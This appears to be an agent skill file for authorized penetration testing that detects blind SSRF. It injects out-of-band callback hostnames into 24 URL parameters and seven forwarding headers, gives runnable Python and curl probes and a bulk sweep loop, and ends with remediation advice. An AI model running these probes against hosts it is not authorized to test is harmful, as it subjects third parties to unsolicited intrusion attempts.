---
name: ssrf-oob
description: Prove blind SSRF by injecting an out-of-band callback into URL params and forwarding headers, then watching for the hit. Use when testing for SSRF.
compatibility: Requires an OAST listener (interactsh-client or Burp Collaborator)
---

## Contents
- Scope & authorization
- Step 0 - stand up the collaborator / OAST listener
- Injection points (query params, headers, bulk sweep)
- Port -> scheme logic
- Methodology
- Runnable snippets
- Output

## Scope & authorization

Only run against hosts you own or are contractually engaged to test. This check is **active and aggressive**: it sends live HTTP requests that try to coerce the target into making outbound DNS/HTTP requests to infrastructure you control. Do not point it at third parties.

The whole method is out-of-band: the target's HTTP response usually will not tell you whether SSRF fired. The signal is the **interaction** (a DNS resolution and/or an HTTP hit) arriving at your callback host. So the OAST listener is the instrument - stand it up first and keep watching it throughout.

## Step 0 - stand up the collaborator / OAST listener

You need a host that logs inbound DNS and HTTP and that you can attribute hits back to. Any of these works; they are interchangeable for this method:

- **Interactsh** (`interactsh-client`) - self-hostable, gives you a unique callback domain and a live feed of DNS/HTTP/SMTP hits.
- **Burp Collaborator** - "Copy to clipboard" a payload domain; poll for interactions.
- **Your own authoritative DNS + web log** - a domain whose NS you control; `tail` the query log and a listener on 80/443.

Call this callback host `OAST_HOST` below. The core trick: encode **who fired the callback into the hostname itself** by prefixing a unique label, e.g. `dest.OAST_HOST`, `xforwardedfor.OAST_HOST`, or `t3-url.OAST_HOST`. Because every injection point uses a distinct subdomain label, a single lookup in your OAST feed tells you exactly which param/header on which target reached out - even though the HTTP response was silent.

## Injection points

A server-side fetch can be triggered from three places an app commonly trusts. Test all three.

**A. Query params** - parameters whose value the app treats as a URL/host/path to fetch, follow, or render. Wordlist (24, carry verbatim):

```
dest, redirect, uri, path, continue, url, window, next, data,
reference, site, html, val, validate, callback, return, page,
feed, host, port, to, out, view, dir
```

**B. Request headers** - forwarding/client-IP headers that reverse proxies and app frameworks sometimes resolve or fetch. Header list (dedup of the source set):

```
X-Forwarded-Host, X-Forwarded-Server, X-Forwarded-For,
X-Real-IP, Client-IP, HTTP-X-Forwarderd-For, HTTP-X-Forwarderd-Host
```

The last two carry the source's real (misspelled) `Forwarderd` variants on purpose - some frameworks pass through non-canonical header names, so keep them exactly as written.

**C. Bulk sweep** - the same param payload fired at every in-scope `host:port` at once, to surface any endpoint that fetches a URL param without you having mapped its routes first.

## Port -> scheme logic

Inputs are `host:port` pairs. Map to a base URL the same way the source does, and skip anything else:

- `:80`  -> `http://host`
- `:443` -> `https://host`
- any other port -> no probe (extend the map explicitly if you know a service's scheme).

Use a browser-like `User-Agent` (`Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/102 Safari/537.36`) so trivial UA filtering does not drop the probe, and disable TLS verification for `https` targets (self-signed origins are common and should still be tested).

## Methodology (run in order)

1. **Arm the listener.** Bring up `OAST_HOST` (Step 0) and confirm you see your own test lookup (`dig test.OAST_HOST`) land in the feed before probing anything.
2. **Query-param injection.** For each in-scope target, build one request that sets **every** param in the wordlist to a uniquely-labelled callback host, and send it. One request per target covers all 24 params.
3. **Header injection.** For each target, send a request whose value for **each** forwarding header is a per-header-labelled callback host (`{header-without-dashes, lowercased}.OAST_HOST`). One request per target covers all headers; the label tells you which header the server resolved.
4. **Bulk sweep.** Replay Step 2's param payload across the full `host:port` list so any unmapped endpoint that fetches a URL param reveals itself.
5. **Watch the feed.** Poll/tail the OAST listener during and for a few minutes after the run - blind fetches, queue workers, and link "unfurlers" can fire seconds to minutes late. Match each inbound subdomain label back to its param/header/target.
6. **Classify the hit.** A **DNS-only** lookup proves the server (or a downstream resolver it uses) processed your host as a name - SSRF-capable, worth escalating. A **full HTTP hit** proves the server actually connected out - unambiguous SSRF; note whether it arrived on 80 or 443 and any `User-Agent`/source IP it presented.

**Report a finding when:** any DNS or HTTP interaction reaches `OAST_HOST` that is attributable to a value you injected. The unique subdomain label identifies the exact injection point (param name or header) and target that caused the server to make an outbound request - that is a confirmed out-of-band SSRF (DNS-only = strong signal / likely blind SSRF; HTTP hit = confirmed full-request SSRF).

## Runnable snippets

```bash
# 0  arm OAST and sanity-check it (Interactsh shown; substitute Collaborator / own DNS)
interactsh-client -v            # note the printed callback domain -> OAST_HOST
dig +short test.OAST_HOST       # should appear in the interactsh feed

# 2  query-param injection across all 24 params, unique label per param, one target
python3 - <<'PY'
import urllib.parse, urllib.request, ssl
OAST="OAST_HOST"; TARGET="https://host"          # from :443 (use http:// for :80)
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
params=["dest","redirect","uri","path","continue","url","window","next","data","reference",
        "site","html","val","validate","callback","return","page","feed","host","port","to","out","view","dir"]
qs=urllib.parse.urlencode({p:f"{p}.{OAST}" for p in params})   # label = the param name
req=urllib.request.Request(f"{TARGET}?{qs}",headers={"User-Agent":UA})
try: urllib.request.urlopen(req,timeout=10,context=ssl._create_unverified_context())
except Exception: pass
PY

# 3  header injection, unique label per header, one target
python3 - <<'PY'
import urllib.request, ssl
OAST="OAST_HOST"; TARGET="https://host"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
hdrs=["X-Forwarded-Host","X-Forwarded-Server","X-Forwarded-For","X-Real-IP","Client-IP",
      "HTTP-X-Forwarderd-For","HTTP-X-Forwarderd-Host"]
h={x:f"{x.replace('-','').lower()}.{OAST}" for x in hdrs}      # label = flattened header name
h["User-Agent"]=UA
req=urllib.request.Request(TARGET,headers=h)
try: urllib.request.urlopen(req,timeout=10,context=ssl._create_unverified_context())
except Exception: pass
PY

# 2/4 pure-curl one-target param probe (bulk = loop this over the host:port list)
curl -sk -o /dev/null -A "Mozilla/5.0 ... Chrome/102 Safari/537.36" \
  "https://host/?dest=dest.OAST_HOST&redirect=redirect.OAST_HOST&url=url.OAST_HOST&uri=uri.OAST_HOST&path=path.OAST_HOST&continue=continue.OAST_HOST&next=next.OAST_HOST&callback=callback.OAST_HOST&feed=feed.OAST_HOST&host=host.OAST_HOST&out=out.OAST_HOST&view=view.OAST_HOST&dir=dir.OAST_HOST&reference=reference.OAST_HOST&site=site.OAST_HOST&return=return.OAST_HOST&page=page.OAST_HOST&window=window.OAST_HOST&data=data.OAST_HOST&val=val.OAST_HOST&validate=validate.OAST_HOST&to=to.OAST_HOST&port=port.OAST_HOST&html=html.OAST_HOST"

# 3  pure-curl one-target header probe
curl -sk -o /dev/null -A "Mozilla/5.0 ... Chrome/102 Safari/537.36" \
  -H "X-Forwarded-Host: xforwardedhost.OAST_HOST" -H "X-Forwarded-Server: xforwardedserver.OAST_HOST" \
  -H "X-Forwarded-For: xforwardedfor.OAST_HOST"   -H "X-Real-IP: xrealip.OAST_HOST" \
  -H "Client-IP: clientip.OAST_HOST"              -H "HTTP-X-Forwarderd-For: httpxforwarderdfor.OAST_HOST" \
  -H "HTTP-X-Forwarderd-Host: httpxforwarderdhost.OAST_HOST" \
  "https://host/"

# 4  bulk sweep over a host:port list (targets.txt = one host:port per line)
while IFS=: read -r host port; do
  case "$port" in 80) base="http://$host";; 443) base="https://$host";; *) continue;; esac
  curl -sk -o /dev/null -A "Mozilla/5.0 ... Chrome/102 Safari/537.36" \
    "$base/?url=${host//./-}-url.OAST_HOST&redirect=${host//./-}-redirect.OAST_HOST&dest=${host//./-}-dest.OAST_HOST"
done < targets.txt
```

## Output

Finish with a per-injection-point ledger, then a one-line verdict:

| Injection point | Probed? | Interaction? | Which fired |
|---|---|---|---|
| Query params (24) | | DNS / HTTP / none | e.g. `url` on host:443 |
| Headers (7) | | DNS / HTTP / none | e.g. `X-Forwarded-Host` |
| Bulk sweep | | DNS / HTTP / none | e.g. host:443 via `redirect` |

- **Clean** - every injection point probed, listener watched well past the request window, no attributable interaction. Note it as *not proven vulnerable* rather than proven safe: OOB depends on egress being allowed, so an egress-filtered target can be silently vulnerable to in-band SSRF - flag that as an unrun angle.
- **Vulnerable** - one or more attributable callbacks. Name the injection point (param/header), the target, and DNS-only vs full-HTTP, and recommend the fix: validate/allowlist outbound destinations, resolve-and-pin to allowed IP ranges (block RFC1918/link-local/metadata), do not resolve or fetch client-controlled forwarding headers, and disable HTTP redirect-following on server-side fetchers.

Report each injection point's true status - probed or not-run - so coverage is honest; a silent listener is only meaningful if the requests actually went out.
